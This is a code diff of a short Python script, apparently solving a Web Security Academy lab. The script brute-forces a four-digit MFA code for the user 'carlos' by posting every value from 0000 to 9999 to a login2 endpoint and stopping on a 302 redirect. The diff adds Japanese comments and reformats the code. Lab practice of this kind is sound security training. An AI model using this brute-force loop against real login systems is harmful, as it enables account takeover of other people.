@@ -4,20 +4,22 @@ base_url = 'https://0a8400bf034cf9958078764300c60095.web-security-academy.net/'
 login2_url = f'{base_url}/login2'
 
 cookies = {
-    'session':'jgQfwcITErWTHFNcJAvImyJDR43o7Ihv',
-    'verify':'carlos'
+    'session': 'jgQfwcITErWTHFNcJAvImyJDR43o7Ihv',
+    'verify': 'carlos'
 }
 
+# 0000 から 9999 まで総当たりで4桁のMFAコードを試行する
 for i in range(10000):
     mfa_code = f'{i:04d}'
     data = {
-        'mfa-code':mfa_code
-        }
-    
+        'mfa-code': mfa_code
+    }
+
     response = requests.post(login2_url, data=data, cookies=cookies, allow_redirects=False)
 
+    # 302 が返れば認証成功とみなす
     if response.status_code == 302:
-        print(f'認証コードは{mfa_code}です。')
+        print(f'認証コードは {mfa_code} です。')
         break
 
     if i % 100 == 0:
